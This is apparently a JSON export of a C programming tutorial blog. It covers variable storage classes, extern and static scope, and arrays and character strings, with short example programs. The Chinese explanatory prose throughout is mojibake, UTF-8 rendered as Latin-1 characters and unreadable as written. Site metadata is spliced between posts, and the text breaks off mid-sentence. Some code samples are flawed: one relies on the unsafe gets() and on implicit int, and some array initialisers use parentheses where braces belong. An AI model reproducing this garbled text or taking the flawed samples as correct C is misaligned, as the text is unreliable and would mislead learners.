å±€éƒ¨å˜é‡çš„å­˜å‚¨ç±»åˆ«è‡ªåŠ¨å˜é‡(autoå˜é‡)å‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡,å¦‚æœä¸ä¸“é—¨å£°æ˜ä¸ºstatic(é™æ€)å­˜å‚¨ç±»å‹,éƒ½æ˜¯åŠ¨æ€åœ°åˆ†é…å­˜å‚¨ç©ºé—´çš„,æ•°æ®å­˜å‚¨åœ¨åŠ¨æ€å­˜å‚¨åŒºä¸­.ç¨‹åºè¿è¡ŒæœŸé—´æ ¹æ®éœ€è¦è¿›è¡ŒåŠ¨æ€çš„åˆ†é…å­˜å‚¨ç©ºé—´çš„æ–¹å¼.å› æ­¤è¿™ç±»å±€éƒ¨å˜é‡ç§°ä¸ºè‡ªåŠ¨å˜é‡. è‡ªåŠ¨å˜é‡ç”¨å…³é”®å­—autoä½œå­˜å‚¨ç±»åˆ«çš„å£°æ˜. int f(int a) //å®šä¹‰få‡½æ•°ï¼Œaä¸ºå½¢å‚ { auto int b, c = 3; //å®šä¹‰bï¼Œcä¸ºè‡ªåŠ¨å˜é‡ } æ‰§è¡Œå®Œåè‡ªåŠ¨é‡Šæ”¾a,b,cæ‰€å çš„å­˜å‚¨å•å…ƒ. autoå…³é”®å­—å¯ä»¥çœç•¥,ä¸å†™autoåˆ™éšå«æŒ‡å®šä¸ºâ€è‡ªåŠ¨å­˜å‚¨ç±»åˆ«â€,å±äºåŠ¨æ€å­˜å‚¨æ–¹å¼. é™æ€å±€éƒ¨å˜é‡(staticå±€éƒ¨å˜é‡)æœ‰æ—¶å¸Œæœ›å‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡çš„å€¼åœ¨å‡½æ•°è°ƒç”¨ç»“æŸåä¸æ¶ˆå¤±è€Œç»§ç»­ä¿ç•™åŸå€¼,å³å…¶å ç”¨çš„å­˜å‚¨ç©ºé—´ä¸é‡Šæ”¾,åœ¨ä¸‹ä¸€æ¬¡å†è°ƒç”¨è¯¥å‡½æ•°æ—¶,è¯¥å˜é‡å·²æœ‰å€¼(å°±æ˜¯ä¸Šä¸€æ¬¡å‡½æ•°è°ƒç”¨ç»“æŸçš„å€¼) #include&lt;stdio.h&gt; int main() { int f(int); int a = 2, i; for (i = 0; i &lt; 3; i++) printf(&quot;%d\\n&quot;, f(a)); return 0; } int f(int a) { auto int b = 0; static c = 3; b = b + 1; c = c + 1; return (a + b + c); } -------- 7 8 9 å¯¹é™æ€å±€éƒ¨å˜é‡æ˜¯åœ¨ç¼–è¯‘æ—¶èµ‹åˆå€¼çš„,å³åªèµ‹å€¼ä¸€æ¬¡,åœ¨ç¨‹åºè¿è¡Œæ—¶å®ƒå·²æœ‰åˆå€¼. è€Œå¯¹è‡ªåŠ¨å˜é‡æ˜¯åœ¨å‡½æ•°è°ƒç”¨æ—¶è¿›è¡Œçš„,æ¯è°ƒç”¨ä¸€æ¬¡å‡½æ•°é‡æ–°ç»™ä¸€æ¬¡åˆå€¼. åœ¨å®šä¹‰å±€éƒ¨å˜é‡æ—¶ä¸èµ‹åˆå€¼çš„è¯,åˆ™å¯¹é™æ€å˜é‡æ¥è¯´,ç¼–è¯‘æ—¶è‡ªåŠ¨èµ‹åˆå€¼0(å¯¹æ•°å€¼å‹å˜é‡)æˆ–ç©ºå­—ç¬¦â€™\\0â€™(å¯¹å­—ç¬¦å˜é‡). è€Œå¯¹è‡ªåŠ¨å˜é‡æ¥è¯´,å®ƒçš„å€¼æ˜¯ä¸€ä¸ªä¸ç¡®å®šçš„å€¼.ç”±äºæ¯æ¬¡å‡½æ•°è°ƒç”¨ç»“æŸåå­˜å‚¨å•å…ƒå·²é‡Šæ”¾,ä¸‹æ¬¡è°ƒç”¨æ—¶åˆé‡æ–°å¦åˆ†é…å­˜å‚¨å•å…ƒ,è€Œæ‰€åˆ†é…çš„å•å…ƒå†…å®¹æ˜¯ä¸å¯çŸ¥çš„. è¾“å‡º1åˆ°5çš„é˜¶ä¹˜å€¼.(å±€éƒ¨é™æ€å˜é‡)#include&lt;stdio.h&gt; int main() { int fac(int); int i; for (i = 1; i &lt;= 5; ++i) { printf(&quot;%d!=%d\\n&quot;, i, fac(i)); } return 0; } int fac(int n) { static int f = 1;//fä¿ç•™äº†ä¸Šæ¬¡å‡½æ•°è°ƒç”¨ç»“æŸçš„å€¼ f = f * n; return (f); } ä¸å»ºè®®ä½¿ç”¨é™æ€å­˜å‚¨,é•¿æœŸå ç”¨ä¸é‡Šæ”¾. å¯„å­˜å™¨å˜é‡(registerå˜é‡) ä¸ºæé«˜æ‰§è¡Œæ•ˆç‡ï¼Œå…è®¸å°†å±€éƒ¨å˜é‡çš„å€¼æ”¾åœ¨CPUä¸­çš„å¯„å­˜å™¨ä¸­ï¼Œéœ€è¦ç”¨æ—¶ç›´æ¥ä»å¯„å­˜å™¨å–å‡ºå‚åŠ è¿ç®—ï¼Œä¸å¿…å†åˆ°å†…å­˜ä¸­å–å­˜å–ã€‚ ä¼˜åŒ–çš„ç¼–è¯‘ç³»ç»Ÿèƒ½å¤Ÿè¯†åˆ«ä½¿ç”¨é¢‘ç¹çš„å˜é‡ï¼Œä»è€Œè‡ªåŠ¨åœ°å°†è¿™äº›å˜é‡æ”¾åœ¨å¯„å­˜å™¨ä¸­ã€‚å› æ­¤å®é™…ä¸Šç”¨registerå£°æ˜å˜é‡çš„å¿…è¦æ€§ä¸å¤§ã€‚ ä¸‰ç§å±€éƒ¨å˜é‡çš„å­˜å‚¨ä½ç½®æ˜¯ä¸åŒçš„ï¼š è‡ªåŠ¨å˜é‡æ˜¯å­˜å‚¨åœ¨åŠ¨æ€å­˜å‚¨åŒºï¼› é™æ€å±€éƒ¨å˜é‡æ˜¯å­˜å‚¨åœ¨é™æ€å­˜å‚¨åŒºï¼› å¯„å­˜å™¨å­˜å‚¨åœ¨CPUä¸­çš„å¯„å­˜å™¨ä¸­ã€‚ å…¨å±€å˜é‡çš„å­˜å‚¨ç±»å‹åœ¨ä¸€ä¸ªæ–‡ä»¶å†…æ‰©å±•å¤–éƒ¨å˜é‡çš„ä½œç”¨åŸŸ å¦‚æœç”±äºæŸç§è€ƒè™‘ï¼Œåœ¨å®šä¹‰ç‚¹ä¹‹å‰çš„å‡½æ•°éœ€è¦å¼•ç”¨è¯¥å¤–éƒ¨å˜é‡ï¼Œåˆ™åœ¨å¼•ç”¨ä¹‹å‰ç”¨å…³é”®å­—externå¯¹è¯¥å˜é‡ä½œâ€œå¤–éƒ¨å˜é‡å£°æ˜â€ï¼Œè¡¨ç¤ºæŠŠè¯¥å¤–éƒ¨å˜é‡çš„ä½œç”¨åŸŸæ‰©å±•åˆ°æ­¤ä½ç½®ã€‚ è°ƒç”¨å‡½æ•°ï¼Œæ±‚3ä¸ªæ•´æ•°ä¸­çš„å¤§è€…ã€‚#include&lt;stdio.h&gt; int main() { int max(); int i; extern int A, B, C; printf(&quot;please enter three integer numbers:&quot;); scanf(&quot;%d %d %d&quot;, &amp;A, &amp;B, &amp;C); printf(&quot;max is %d\\n&quot;, max()); return 0; } int A, B, C; int max() { int m; m = A &gt; B ? A : B; if (C &gt; m)m = C; return m; } å°†å¤–éƒ¨å˜é‡çš„ä½œç”¨åŸŸæ‰©å±•åˆ°å…¶ä»–æ–‡ä»¶ç»™å®šbçš„å€¼ï¼Œè¾“å…¥aå’Œmï¼Œæ±‚a*bå’Œ$a^m$çš„å€¼#include&lt;stdio.h&gt; //file1.c int A; int main() { int power(int); int b = 3, c, d, m; printf(&quot;please enter the number a and its power m:\\n&quot;); scanf(&quot;%d,%d&quot;, &amp;A, &amp;m); c = A * b; printf(&quot;%d*%d=%d\\n&quot;, A, b, c); d = power(m); printf(&quot;%d**%d=%d\\n&quot;, A, m, d); return 0; } //file2.c extern A; int power(int n) { int i, y = 1; for (i = 1; i &lt;= n; i++) y *= A; return y; } externæ—¢å¯ä»¥ç”¨æ¥æ‰©å±•å¤–éƒ¨å˜é‡åœ¨æœ¬æ–‡ä»¶çš„ä½œç”¨åŸŸ,åˆå¯ä»¥ä½¿å¤–éƒ¨å˜é‡çš„ä½œç”¨åŸŸä»ä¸€ä¸ªæ–‡ä»¶æ‰©å±•åˆ°ç¨‹åºä¸­çš„å…¶ä»–æ–‡ä»¶,é‚£ä¹ˆç³»ç»Ÿæ€ä¹ˆåŒºåˆ«å¤„ç†å‘¢? åœ¨ç¼–è¯‘æ—¶é‡åˆ°externæ—¶,å…ˆåœ¨æœ¬æ–‡ä»¶ä¸­æ‰¾å¤–éƒ¨å˜é‡çš„å®šä¹‰,å¦‚æœæ‰¾åˆ°,åˆ™åœ¨æœ¬æ–‡ä»¶ä¸­æ‰©å±•ä½œç”¨åŸŸ; å¦‚æœæ‰¾ä¸åˆ°,å°±åœ¨è¿æ¥æ—¶ä»å…¶ä»–æ–‡ä»¶æ‰¾åˆ°å¤–éƒ¨å˜é‡çš„å®šä¹‰,å¦‚æœä»å…¶ä»–æ–‡ä»¶ä¸­æ‰¾åˆ°äº†,å°±å°†ä½œç”¨åŸŸæ‰©å±•åˆ°æœ¬æ–‡ä»¶;å¦‚æœå†æ‰¾ä¸åˆ°,å°±æŒ‰å‡ºé”™å¤„ç†. å°†å¤–éƒ¨å˜é‡çš„ä½œç”¨åŸŸé™åˆ¶åœ¨æœ¬æ–‡ä»¶ä¸­æœ‰æ—¶åœ¨ç¨‹åºè®¾è®¡ä¸­å¸Œæœ›æŸäº›å¤–éƒ¨å˜é‡åªé™äºè¢«æœ¬æ–‡ä»¶å¼•ç”¨,è€Œä¸èƒ½è¢«å…¶ä»–æ–‡ä»¶å¼•ç”¨,è¿™æ—¶å¯ä»¥åœ¨å®šä¹‰å¤–éƒ¨å˜é‡æ—¶åŠ ä¸€ä¸ªstaticå£°æ˜. åŠ ä¸Šstaticå£°æ˜,åªèƒ½ç”¨äºæœ¬æ–‡ä»¶çš„å¤–éƒ¨å˜é‡ç§°ä¸ºé™æ€å¤–éƒ¨å˜é‡.è¿™å°±ä¸ºç¨‹åºçš„æ¨¡å—åŒ–,é€šç”¨æ€§æä¾›æ–¹ä¾¿. å¦‚æœå·²ç¡®è®¤å…¶ä»–æ–‡ä»¶ä¸éœ€è¦å¼•ç”¨æœ¬æ–‡ä»¶çš„å¤–éƒ¨å˜é‡,å°±å¯ä»¥å¯¹æœ¬æ–‡ä»¶çš„å¤–éƒ¨å˜é‡éƒ½åŠ ä¸Šstatic,æˆä¸ºé™æ€å¤–éƒ¨å˜é‡,ä»¥å…è¢«å…¶ä»–æ–‡ä»¶è¯¯ç”¨.è¿™å°±ç›¸å½“äºæŠŠæœ¬æ–‡ä»¶çš„å¤–éƒ¨å˜é‡å¯¹å¤–ç•Œâ€å±è”½èµ·æ¥â€,ä»å…¶ä»–æ–‡ä»¶çš„è§’åº¦çœ‹,è¿™ä¸ªé™æ€å¤–éƒ¨å˜é‡æ˜¯â€çœ‹ä¸è§çš„,ä¸èƒ½ç”¨çš„â€. ç”¨staticå£°æ˜ä¸€ä¸ªå˜é‡çš„ä½œç”¨: å¯¹å±€éƒ¨å˜é‡ä½¿ç”¨: æŠŠå®ƒåˆ†é…åœ¨é™æ€å­˜å‚¨åŒº,è¯¥å˜é‡åœ¨æ•´ä¸ªç¨‹åºæ‰§è¡ŒæœŸé—´ä¸é‡Šæ”¾,å…¶æ‰€åˆ†é…çš„ç©ºé—´å§‹ç»ˆå­˜åœ¨. å¯¹å…¨å±€å˜é‡ä½¿ç”¨: åˆ™è¯¥å˜é‡çš„ä½œç”¨åŸŸåªé™äºæœ¬æ–‡ä»¶æ¨¡å—(å³è¢«å£°æ˜çš„æ–‡ä»¶ä¸­). æ³¨æ„:auto,static,registerå£°æ˜å˜é‡æ—¶,æ˜¯åœ¨å®šä¹‰å˜é‡çš„åŸºç¡€ä¸ŠåŠ ä¸Šè¿™äº›å…³é”®å­—,ä¸èƒ½å•ç‹¬ä½¿ç”¨ å¦‚: int a; static a; //ä¼å›¾å°†å˜é‡aå£°æ˜ä¸ºé™æ€å˜é‡ ç¼–è¯‘æ—¶ä¼šè¢«è®¤ä¸ºâ€é‡æ–°å®šä¹‰â€. å…³äºå˜é‡çš„å£°æ˜å’Œå®šä¹‰ å®šä¹‰:å»ºç«‹å­˜å‚¨ç©ºé—´çš„å£°æ˜(â€œint a;â€),å®šä¹‰æ€§å£°æ˜ å£°æ˜:ä¸å»ºç«‹å­˜å‚¨ç©ºé—´çš„å£°æ˜(â€œextern a;â€),å¼•ç”¨æ€§å£°æ˜ å£°æ˜åŒ…æ‹¬å®šä¹‰,ä½†å¹¶éæ‰€æœ‰çš„å£°æ˜éƒ½æ˜¯å®šä¹‰. å†…éƒ¨å‡½æ•°å’Œå¤–éƒ¨å‡½æ•°å†…éƒ¨å‡½æ•°å¦‚æœä¸€ä¸ªå‡½æ•°åªèƒ½è¢«æœ¬æ–‡ä»¶ä¸­çš„å…¶ä»–å‡½æ•°æ‰€è°ƒç”¨ï¼Œå®ƒç§°ä¸ºå†…éƒ¨å‡½æ•°ï¼Œåœ¨å®šä¹‰å†…éƒ¨å‡½æ•°æ—¶ï¼Œåœ¨å‡½æ•°åå’Œå‡½æ•°ç±»å‹çš„å‰é¢åŠ staticï¼Œå³ï¼š static ç±»å‹å å‡½æ•°å(å½¢å‚è¡¨) static int fun(int a,int b) å†…éƒ¨å‡½æ•°åˆè¢«ç§°ä¸ºé™æ€å‡½æ•°ï¼Œå› ä¸ºå®ƒæ˜¯ç”¨staticå£°æ˜çš„ã€‚ä½¿ç”¨å†…éƒ¨å‡½æ•°ï¼Œå¯ä»¥ä½¿å‡½æ•°çš„ä½œç”¨åŸŸåªå±€é™äºæ‰€åœ¨æ–‡ä»¶ã€‚è¿™æ ·ï¼Œåœ¨ä¸åŒçš„æ–‡ä»¶ä¸­å³ä½¿æœ‰åŒåçš„å†…éƒ¨å‡½æ•°ï¼Œä¹Ÿäº’ä¸å¹²æ‰°ï¼Œä¸å¿…æ‹…å¿ƒæ‰€ç”¨å‡½æ•°æ˜¯å¦ä¼šä¸å…¶ä»–æ–‡ä»¶ä¸­çš„æ¨¡å—ä¸­çš„å‡½æ•°åŒåã€‚ å¤–éƒ¨å‡½æ•°å¦‚æœåœ¨å®šä¹‰å‡½æ•°æ—¶ï¼Œåœ¨å‡½æ•°é¦–éƒ¨çš„æœ€å·¦ç«¯åŠ å…³é”®å­—externï¼Œåˆ™æ­¤å‡½æ•°æ˜¯å¤–éƒ¨å‡½æ•°ï¼Œå¯ä¾›å…¶ä»–æ–‡ä»¶ä½¿ç”¨ã€‚ å¦‚å‡½æ•°é¦–éƒ¨å¯ä»¥ä¸ºï¼š extern int fun(int a,int b) è¿™æ ·ï¼Œå‡½æ•°funå°±å¯ä»¥ä¸ºå…¶ä»–æ–‡ä»¶è°ƒç”¨ã€‚cè¯­è¨€è§„å®šï¼Œå¦‚æœåœ¨å®šä¹‰å‡½æ•°æ—¶çœç•¥externï¼Œåˆ™é»˜è®¤ä¸ºå¤–éƒ¨å‡½æ•°ã€‚ æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå†…æœ‰è‹¥å¹²ä¸ªå­—ç¬¦ï¼Œç°è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œè¦æ±‚ç¨‹åºå°†å­—ç¬¦ä¸²ä¸­è¯¥å­—ç¬¦åˆ å»ã€‚#include&lt;stdio.h&gt; //file1.c int main() { extern void enter_string(char str[80]); extern void delete_string(char str[], char ch); extern void print_string(char str[]); char c, str[80]; enter_string(str); scanf(&quot;%c&quot;, &amp;c);//è¾“å…¥éœ€è¦åˆ é™¤çš„å­—ç¬¦ delete_string(str, c); print_string(str); return 0; } //file2.c void enter_string(char str[80]) { gets(str); } //file3.c void delete_string(char str[], char ch) { int i, j; for (int i = j = 0; str[i] != &#39;\\0&#39;; i++) if (str[i] != ch) str[j++] = str[i]; str[j] = &#39;\\0&#39;; } //file4.c void print_string(char str[]) { printf(&quot;%s\\n&quot;, str); } externå¯ä»¥çœç•¥","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"use-arrays-to-process-batch-data","slug":"use-arrays-to-process-batch-data","date":"2020-10-25T09:17:20.000Z","updated":"2021-04-11T17:11:28.542Z","comments":true,"path":"use-arrays-to-process-batch-data/","link":"","permalink":"https://blog.kayleh.top/use-arrays-to-process-batch-data/","excerpt":"","text":"åˆ©ç”¨æ•°ç»„å¤„ç†æ‰¹é‡æ•°æ® use-arrays-to-process-batch-data 1.æ•°ç»„ä½¿ä¸€ç»„æœ‰åºæ•°æ®çš„é›†åˆ. 2.ç”¨ä¸€ä¸ªæ•°ç»„åå’Œä¸‹æ ‡æ¥å”¯ä¸€åœ°ç¡®å®šæ•°ç»„ä¸­çš„å…ƒç´  3.æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½å±äºåŒä¸€ä¸ªæ•°æ®ç±»å‹ æ€æ ·å®šä¹‰å’Œå¼•ç”¨ä¸€ç»´æ•°ç»„ ç±»å‹ç¬¦ æ•°ç»„å[å¸¸é‡è¡¨è¾¾å¼] æ€ä¹ˆå¼•ç”¨ä¸€ç»´æ•°ç»„å…ƒç´  æ•°ç»„å[ä¸‹æ ‡] å¯¹10ä¸ªæ•°ç»„å…ƒç´ ä¾æ¬¡èµ‹å€¼ä¸º0,1,2,3,4,5,6,7,8,9,è¦æ±‚æŒ‰é€†åºè¾“å‡º. #include&lt;stdio.h&gt; int main() { int i, a[10]; for (i = 0; i &lt;= 9; i++) { a[i] = i; } for (i = 9; i &gt;= 0; i--) { printf(&quot;%d &quot;, a[i]); } return 0; } ä¸€ç»´æ•°ç»„çš„åˆå§‹åŒ–1)åœ¨å®šä¹‰æ•°ç»„æ—¶å¯¹å…¨éƒ¨æ•°ç»„å…ƒç´ èµ‹äºˆåˆå€¼. 2)å¯ä»¥åªç»™æ•°ç»„ä¸­çš„ä¸€éƒ¨åˆ†å…ƒç´ èµ‹å€¼(åªç»™å‰nä¸ªå…ƒç´ èµ‹å€¼,å…¶ä½™çš„å…ƒç´ è‡ªåŠ¨èµ‹å€¼ä¸º0) 3)å¦‚æœæƒ³ä½¿ä¸€ä¸ªæ•°ç»„ä¸­å…¨éƒ¨å…ƒç´ å€¼ä¸º0,å¯ä»¥å†™æˆ int a[10]={0}; 4)åœ¨å¯¹å…¨éƒ¨å…ƒç´ èµ‹å€¼æ—¶,å¦‚æœæ•°æ®çš„ä¸ªæ•°å·²ç»ç¡®å®š,å› æ­¤å¯ä»¥ä¸æŒ‡å®šæ•°ç»„é•¿åº¦. ç”¨æ•°ç»„æ¥å¤„ç†æ±‚Fibonacciæ•°åˆ—é—®é¢˜#include&lt;stdio.h&gt; int main() { int i; int f[20] = {1, 1}; for (i = 2; i &lt; 20; i++) { f[i] = f[i - 2] + f[i - 1]; } for (i = 0; i &lt; 20; i++) { if (i % 5 == 0) printf(&quot;\\n&quot;); printf(&quot;%12d&quot;, f[i]); } printf(&quot;\\n&quot;); return 0; } æœ‰10ä¸ªåœ°åŒºçš„é¢ç§¯,è¦æ±‚å¯¹å®ƒä»¬æŒ‰ç”±å°åˆ°å¤§çš„é¡ºåºæ’åˆ—(å†’æ³¡æ’åº)#include&lt;stdio.h&gt; int main() { int a[10]; int i, j, t; printf(&quot;input 10 numbers:\\n&quot;); for (i = 0; i &lt; 10; i++) scanf(&quot;%d&quot;, &amp;a[i]); printf(&quot;\\n&quot;); for (j = 0; j &lt; 9; j++) { for (i = 0; i &lt; 9 - j; i++) { if (a[i] &gt; a[i + 1]) { t = a[i]; a[i] = a[i + 1]; a[i + 1] = t; } } } printf(&quot;the sorted number:\\n&quot;); for (i = 0; i &lt; 10; i++) { printf(&quot;%d &quot;, a[i]); } printf(&quot;\\n&quot;); return 0; } æ€æ ·å®šä¹‰å’Œå¼•ç”¨äºŒç»´æ•°ç»„äºŒç»´æ•°ç»„å¸¸ç§°ä¸ºçŸ©é˜µ. æ€ä¹ˆå®šä¹‰äºŒç»´æ•°ç»„ float pay[3][6] ç±»å‹è¯´æ˜ç¬¦ æ•°ç»„å[å¸¸é‡è¡¨è¾¾å¼][å¸¸é‡è¡¨è¾¾å¼] äºŒç»´æ•°ç»„ä¸­å…ƒç´ æ’åˆ—çš„é¡ºåºæ˜¯æŒ‰è¡Œå­˜æ”¾çš„,å³åœ¨å†…å­˜ä¸­å…ˆé¡ºåºå­˜æ”¾ç¬¬1è¡Œçš„å…ƒç´ ,æ¥ç€å†å­˜æ”¾ç¬¬2è¡Œçš„å…ƒç´ .æ‰€ä»¥ç¬¬1ç»´çš„ä¸‹æ ‡å˜åŒ–æœ€æ…¢,æœ€å³è¾¹çš„ä¸‹æ ‡å˜åŒ–æœ€å¿« äºŒç»´æ•°ç»„çš„åˆå§‹åŒ–$èŠ±æ‹¬å·æ˜¾ç¤ºå¼‚å¸¸ 1)åˆ†è¡Œç»™äºŒç»´æ•°ç»„èµ‹åˆå€¼ int a[3][4]=({1,2,3,4},{5,6,7,8},{9,10,11,12}) 2)å¯ä»¥å°†æ‰€æœ‰æ•°æ®å†™åœ¨ä¸€ä¸ªèŠ±æ‹¬å·å†…,æŒ‰æ•°ç»„å…ƒç´ åœ¨å†…å­˜ä¸­çš„æ’åˆ—é¡ºåºå¯¹å„å…ƒç´ èµ‹åˆå€¼. int a[3][4]={1,2,3,4,5,6,7,8,9,10,11,12} 3)å¯ä»¥å¯¹éƒ¨åˆ†å…ƒç´ èµ‹åˆå€¼ int a[3][4]=({1},{5},{9}) 1 0 0 0 5 0 0 0 9 0 0 0 ä¹Ÿå¯ä»¥ä¸èµ‹åˆå€¼ int a[3][4]=({1},{},{9}) 4)å¦‚æœå¯¹å…¨éƒ¨å…ƒç´ éƒ½èµ‹åˆå€¼(å³æä¾›å…¨éƒ¨åˆå§‹æ•°æ®),åˆ™å®šä¹‰æ•°ç»„æ—¶å¯¹ç¬¬1ç»´çš„é•¿åº¦å¯ä»¥ä¸æŒ‡å®š,ä½†ç¬¬2ç»´çš„é•¿åº¦ä¸èƒ½çœ. å¦‚: int a[3][4]={1,2,3,4,5,6,7,8,9,10,11,12}; ç­‰ä»·äº int a[][4]={1,2,3,4,5,6,7,8,9,10,11,12}; åœ¨å®šä¹‰æ—¶ä¹Ÿå¯ä»¥åªå¯¹éƒ¨åˆ†å…ƒç´ èµ‹åˆå€¼è€Œçœç•¥ç¬¬1ç»´çš„é•¿åº¦,ä½†åº”åˆ†è¡Œèµ‹å€¼. int a[][4]=({0,0,3},{},{0,10}); å°†ä¸€ä¸ªäºŒç»´æ•°ç»„è¡Œå’Œåˆ—çš„å…ƒç´ äº’æ¢,å­˜åˆ°å¦ä¸€ä¸ªäºŒç»´æ•°ç»„é‡Œé¢.ä¾‹å¦‚: 1 4 a=[1 2 3] b = [ 2 5 ] 4 5 6 3 6 #include&lt;stdio.h&gt; int main() { int a[2][3] = {{1, 2, 3}, {4, 5, 6}}; int b[3][2], i, j; printf(&quot;array a:\\n&quot;); for (i = 0; i &lt;= 1; i++) { for (j = 0; j &lt;= 2; j++) { printf(&quot;%5d&quot;, a[i][j]); b[j][i] = a[i][j]; } printf(&quot;\\n&quot;); } printf(&quot;array b:\\n&quot;); for (i = 0; i &lt;= 2; ++i) { for (j = 0; j &lt;= 1; ++j) { printf(&quot;%5d&quot;, b[i][j]); } printf(&quot;\\n&quot;); } return 0; } å­—ç¬¦æ•°ç»„ç”¨æ¥å­˜æ”¾å­—ç¬¦æ•°æ®çš„æ•°ç»„æ—¶å­—ç¬¦æ•°ç»„. ä¾‹å¦‚: char c[10]; c[0] = &#39;I&#39;; c[1] = &#39; &#39;; c[2] = &#39;a&#39;; c[3] = &#39;m&#39;; c[4] = &#39; &#39;; c[5] = &#39;K&#39;; ç”±äºå­—ç¬¦å‹æ•°æ®æ˜¯ä»¥æ•´æ•°å½¢å¼(ASCIIä»£ç )å­˜æ”¾çš„,å› æ­¤ä¹Ÿå¯ä»¥ç”¨æ•´å‹æ•°ç»„æ¥å­˜æ”¾å­—ç¬¦æ•°æ®. int c[10]; c[1] = &#39;a&#39;;//åˆæ³•ï¼Œä½†æµªè´¹å­˜å‚¨ç©ºé—´ å­—ç¬¦æ•°ç»„çš„åˆå§‹åŒ–å¦‚æœåˆå€¼ä¸ªæ•°å°äºæ•°ç»„é•¿åº¦ï¼Œåˆ™åªå°†è¿™äº›å­—ç¬¦èµ‹ç»™æ•°ç»„ä¸­å‰é¢é‚£äº›å…ƒç´ ï¼Œå…¶ä½™çš„å…ƒç´ è‡ªåŠ¨å®šä¸ºç©ºå­—ç¬¦(å³â€™\\0â€™).å¦‚: char c[10] = {&#39;c&#39;, &#39; &#39;, &#39;p&#39;, &#39;p&#39;}; å¦‚æœæä¾›çš„åˆå€¼ä¸ªæ•°ä¸é¢„å®šçš„æ•°ç»„é•¿åº¦ç›¸åŒ,åœ¨å®šä¹‰æ—¶å¯ä»¥çœç•¥æ•°ç»„é•¿åº¦,ç³»ç»Ÿä¼šè‡ªåŠ¨æ ¹æ®åˆå€¼ä¸ªæ•°ç¡®å®šæ•°ç»„é•¿åº¦ char c[] = {&#39;c&#39;, &#39; &#39;, &#39;p&#39;, &#39;p&#39;}; ä¹Ÿå¯ä»¥å®šä¹‰äºŒç»´å­—ç¬¦æ•°ç»„ char diamond[5][5] = {{' ', ' ', '*'}, {' ', '*', ' ', '*'},{'*', ' ', ' ', ' ', '*'},{ ' ', '*', ' ', '*' },{ ' ', ' ', '*' }}; æ€æ ·å¼•ç”¨å­—ç¬¦æ•°ç»„ä¸­çš„å…ƒç´ è¾“å‡ºä¸€ä¸ªå·²çŸ¥çš„å­—ç¬¦ä¸² #include&lt;stdio.h&gt; int main() { char c[15] = {&#39;I&#39;, &#39; &#39;, &#39;a&#39;, &#39;m&#39;, &#39; &#39;, &#39;a&#39;, &#39; &#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;d&#39;, &#39;e&#39;, &#39;n&#39;, &#39;t&#39;}; int i; for (i = 0; i &lt; 15; i++) printf(&quot;%c&quot;, c[i]); printf(&quot;\\n&quot;); return 0; } è¾“å‡ºä¸€ä¸ªè±å½¢å›¾ #include&lt;stdio.h&gt; int main() { char diamond[5][5] = {{' ', ' ', '*'}, {' ', '*', ' ', '*'}, {'*', ' ', ' ', ' ', '*'},{ ' ', '*', ' ', '*' },{ ' ', ' ', '*' }}; int i, j; for (i = 0; i &lt; 5; i++) { for (j = 0; j &lt; 5; j++) printf(&quot;%c&quot;, diamond[i][j]); printf(&quot;\\n&quot;); } return 0; } å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²ä½ ç»“æŸæ ‡å¿—é‡åˆ°å­—ç¬¦â€™\\0â€™æ—¶,è¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸ,æŠŠå®ƒå‰é¢çš„å­—ç¬¦ç»„æˆä¸€ä¸ªå­—ç¬¦ä¸². Cç³»ç»Ÿåœ¨ç”¨å­—ç¬¦æ•°ç»„å­˜å‚¨å­—ç¬¦ä¸²å¸¸é‡æ—¶ä¼šè‡ªåŠ¨åŠ ä¸€ä¸ªâ€™\\0â€™ä½œä¸ºç»“æŸç¬¦.é‡åˆ°â€™\\0â€™ä¼šåœæ­¢è¾“å‡º ä¾‹å¦‚: char c[] = {&quot;I am happy&quot;}; char c[] = &quot;I am happy&quot;;//èŠ±æ‹¬å·å¯ä»¥çœç•¥ //å¯ä»¥å†™æˆ: char c[] = {&#39;I&#39;, &#39; &#39;, &#39;a&#39;, &#39;m&#39;, &#39; &#39;, &#39;h&#39;, &#39;a&#39;, &#39;p&#39;, &#39;p&#39;, &#39;y&#39;,&#39;\\0&#39;}; æ­¤æ—¶æ•°ç»„cçš„é•¿åº¦ä¸æ˜¯10è€Œæ˜¯11,å› ä¸ºå­—ç¬¦ä¸²å¸¸é‡çš„æœ€åç”±ç³»ç»ŸåŠ ä¸Šä¸€ä¸ªâ€™\\0â€™. å­—ç¬¦æ•°ç»„çš„è¾“å…¥è¾“å‡º1)é€ä¸ªå­—ç¬¦è¾“å…¥è¾“å‡º,ç”¨æ ¼å¼ç¬¦â€%câ€è¾“å…¥æˆ–è¾“å‡ºä¸€ä¸ªå­—ç¬¦. 2)å°†æ•´ä¸ªå­—ç¬¦ä¸²ä¸€æ¬¡è¾“å…¥æˆ–è¾“å‡º.ç”¨â€%sâ€æ ¼å¼ç¬¦,æ„æ€æ˜¯å¯¹å­—ç¬¦ä¸²(string)çš„è¾“å…¥è¾“å‡º. ä¾‹å¦‚: char c[] = {&quot;China&quot;}; printf(&quot;%s\\n&quot;, c); 1.å¦‚æœä¸€ä¸ªå­—ç¬¦æ•°ç»„ä¸­åŒ…å«ä¸€ä¸ªä»¥ä¸Šâ€™\\0â€™,åˆ™é‡åˆ°ç¬¬ä¸€ä¸ªâ€™\\0â€™æ—¶è¾“å‡ºå°±ç»“æŸ. 2.å¯ä»¥ç”¨scanfå‡½æ•°è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²,å¦‚: scanf(&quot;%s&quot;,c); 3.æ•°ç»„ä¸­æœªè¢«èµ‹å€¼çš„å…ƒç´ çš„å€¼è‡ªåŠ¨ç½®â€™\\0â€™ 4.ç³»ç»Ÿä¼šæŠŠç©ºæ ¼å­—ç¬¦ä½œä¸ºè¾“å…¥çš„å­—ç¬¦ä¸²ä¹‹é—´çš„åˆ†éš”ç¬¦ 5.scanfå‡½æ•°ä¸­çš„è¾“å…¥é¡¹å¦‚æœæ˜¯å­—ç¬¦æ•°ç»„å,ä¸è¦å†åŠ åœ°å€ç¬¦&amp;,å› 